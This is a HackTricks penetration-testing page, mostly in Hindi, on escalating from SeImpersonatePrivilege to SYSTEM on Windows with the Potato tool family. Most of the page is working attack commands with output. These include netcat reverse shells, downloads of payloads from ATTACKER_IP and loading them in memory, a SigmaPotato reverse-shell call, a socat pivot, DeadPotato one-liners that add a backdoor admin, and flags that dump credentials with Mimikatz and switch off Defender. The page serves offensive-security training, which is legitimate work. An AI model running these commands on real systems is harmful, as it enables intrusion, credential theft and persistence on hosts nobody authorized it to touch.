# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato काम नहीं करता** Windows Server 2019 और Windows 10 build 1809 के बाद के versions पर। हालांकि, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** का उपयोग **समान privileges का लाभ उठाने और `NT AUTHORITY\SYSTEM`** स्तर की access प्राप्त करने के लिए किया जा सकता है। यह [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` tool के बारे में विस्तार से बताती है, जिसका उपयोग Windows 10 और Server 2019 hosts पर impersonation privileges का दुरुपयोग करने के लिए किया जा सकता है, जहां JuicyPotato अब काम नहीं करता।<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> 2024–2025 में frequently maintained एक modern alternative SigmaPotato है (GodPotato का fork), जो in-memory/.NET reflection usage और extended OS support जोड़ता है। नीचे quick usage और References में repo देखें।

Background और manual techniques के लिए संबंधित pages:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements और common gotchas

नीचे दी गई सभी techniques ऐसे privileged service का abuse करने पर निर्भर करती हैं, जो impersonation-capable हो और ऐसे context से access किया जा रहा हो जिसमें इनमें से कोई privilege हो:

- SeImpersonatePrivilege (सबसे common) या SeAssignPrimaryTokenPrivilege
- यदि token में पहले से SeImpersonatePrivilege मौजूद है, तो High integrity required नहीं है (यह कई service accounts, जैसे IIS AppPool, MSSQL आदि के लिए typical है)

Privileges जल्दी check करें:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- यदि आपका shell SeImpersonatePrivilege से रहित restricted token के अंतर्गत चलता है (कुछ contexts में Local Service/Network Service के लिए सामान्य), तो FullPowers का उपयोग करके account के default privileges पुनः प्राप्त करें, फिर Potato चलाएँ। उदाहरण: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer के लिए Print Spooler service का चलना और local RPC endpoint (spoolss) पर reachable होना आवश्यक है। उन hardened environments में जहाँ PrintNightmare के बाद Spooler disabled है, RoguePotato/GodPotato/DCOMPotato/EfsPotato को प्राथमिकता दें।
- RoguePotato के लिए TCP/135 पर reachable OXID resolver आवश्यक है। यदि egress blocked है, तो redirector/port-forwarder का उपयोग करें (नीचे उदाहरण देखें)। पुराने builds में -f flag आवश्यक था।
- EfsPotato/SharpEfsPotato MS-EFSR का abuse करते हैं; यदि एक pipe blocked है, तो alternative pipes (lsarpc, efsrpc, samr, lsass, netlogon) आज़माएँ।
- RpcBindingSetAuthInfo के दौरान Error 0x6d3 आमतौर पर unknown/unsupported RPC authentication service को दर्शाता है; कोई अलग pipe/transport आज़माएँ या सुनिश्चित करें कि target service चल रही है।
- DeadPotato जैसे “Kitchen-sink” forks अतिरिक्त payload modules (Mimikatz/SharpHound/Defender off) को bundle करते हैं, जो disk को touch करते हैं; slim originals की तुलना में higher EDR detection की अपेक्षा रखें।

## त्वरित Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
नोट्स:
- आप वर्तमान console में एक interactive process शुरू करने के लिए `-i` या one-liner चलाने के लिए `-c` का उपयोग कर सकते हैं।
- Spooler service आवश्यक है। यदि यह disabled है, तो यह fail हो जाएगा।

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
यदि outbound 135 अवरुद्ध है, तो अपने redirector पर socat के माध्यम से OXID resolver को pivot करें:<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato एक नया COM abuse primitive है, जिसे 2022 के अंत में जारी किया गया था। यह Spooler/BITS के बजाय **PrintNotify** service को target करता है। Binary PrintNotify COM server को instantiate करता है, एक fake `IUnknown` को swap in करता है, फिर `CreatePointerMoniker` के माध्यम से एक privileged callback trigger करता है। जब **SYSTEM** के रूप में चल रही PrintNotify service वापस connect करती है, तो process प्राप्त token को duplicate करता है और दिए गए payload को full privileges के साथ spawn करता है।<sup>[[13]](#references)</sup>

मुख्य operational notes:

* यह Windows 10/11 और Windows Server 2012–2022 पर काम करता है, बशर्ते Print Workflow/PrintNotify service installed हो (यह तब भी मौजूद रहती है जब PrintNightmare के बाद legacy Spooler disabled हो)।
* Calling context के पास **SeImpersonatePrivilege** होना आवश्यक है (जो आमतौर पर IIS APPPOOL, MSSQL और scheduled-task service accounts के पास होता है)।
* यह direct command या interactive mode, दोनों स्वीकार करता है, ताकि आप original console के अंदर रह सकें। उदाहरण:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* क्योंकि यह पूरी तरह COM-based है, इसलिए किसी named-pipe listener या external redirector की आवश्यकता नहीं होती। इससे यह उन hosts पर drop-in replacement बन जाता है जहाँ Defender RoguePotato की RPC binding को block करता है।

Ink Dragon जैसे operators SharePoint पर ViewState RCE प्राप्त करने के तुरंत बाद PrintNotifyPotato चलाते हैं, ताकि ShadowPad install करने से पहले `w3wp.exe` worker से SYSTEM तक pivot किया जा सके।<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
युक्ति: यदि एक pipe विफल हो जाए या EDR उसे block कर दे, तो अन्य supported pipes आज़माएँ:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
नोट्स:
- Windows 8/8.1–11 और Server 2012–2022 पर तब काम करता है जब SeImpersonatePrivilege मौजूद हो।
- installed runtime से मेल खाने वाली binary प्राप्त करें (जैसे, modern Server 2022 पर `GodPotato-NET4.exe`)।
- यदि आपका initial execution primitive short timeouts वाला webshell/UI है, तो payload को script के रूप में stage करें और लंबी inline command के बजाय GodPotato से उसे run करने को कहें।<sup>[[12]](#references)</sup>

writable IIS webroot से Quick staging pattern:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato service DCOM objects को target करने वाले दो variants प्रदान करता है, जो default रूप से RPC_C_IMP_LEVEL_IMPERSONATE का उपयोग करते हैं। दिए गए binaries को build करें या उनका उपयोग करें और अपना command चलाएँ:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato आधुनिक सुविधाएँ जोड़ता है, जैसे .NET reflection के माध्यम से in-memory execution और PowerShell reverse shell helper।<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
2024–2025 builds (v1.2.x) में अतिरिक्त फायदे:
- Built-in reverse shell flag `--revshell` और 1024-character PowerShell limit को हटाया गया है, इसलिए आप लंबे AMSI-bypassing payloads को एक ही बार में चला सकते हैं।
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), साथ ही `VirtualAllocExNuma()` के माध्यम से एक rudimentary AV evasion trick, जो simple heuristics को भ्रमित कर सकती है।
- PowerShell Core environments के लिए .NET 2.0 के विरुद्ध compiled अलग `SigmaPotatoCore.exe`।

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato GodPotato की OXID/DCOM impersonation chain को बनाए रखता है, लेकिन इसमें post-exploitation helpers शामिल हैं, ताकि operators तुरंत SYSTEM ले सकें और अतिरिक्त tooling के बिना persistence/collection कर सकें।<sup>[[15]](#references)</sup>

Common modules (सभी के लिए SeImpersonatePrivilege आवश्यक है):

- `-cmd "<cmd>"` — SYSTEM के रूप में arbitrary command चलाता है।
- `-rev <ip:port>` — quick reverse shell।
- `-newadmin user:pass` — persistence के लिए local admin बनाता है।
- `-mimi sam|lsa|all` — credentials dump करने के लिए Mimikatz को disk पर drop करके चलाता है (disk को छूता है, noisy है)।
- `-sharphound` — SYSTEM के रूप में SharpHound collection चलाता है।
- `-defender off` — Defender real-time protection को disable करता है (बहुत noisy)।

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
क्योंकि इसमें अतिरिक्त binaries शामिल हैं, AV/EDR flags अधिक मिलने की अपेक्षा रखें; जब stealth महत्वपूर्ण हो, तो हल्के GodPotato/SigmaPotato का उपयोग करें।

## संदर्भ

- [1] [PrintSpoofer – Windows 10 और Server 2019 पर Impersonation Privileges का दुरुपयोग](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [JuicyPotato अब नहीं? पुरानी कहानी, RoguePotato का स्वागत है](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – service accounts के लिए default token privileges पुनर्स्थापित करें](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction से webroot RCE → SYSTEM तक FullPowers + GodPotato](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice macro → IIS webshell → SYSTEM तक GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Inside Ink Dragon: Relay Network और Stealthy Offensive Operation की आंतरिक कार्यप्रणाली का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – built-in post-ex modules के साथ GodPotato का rework](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
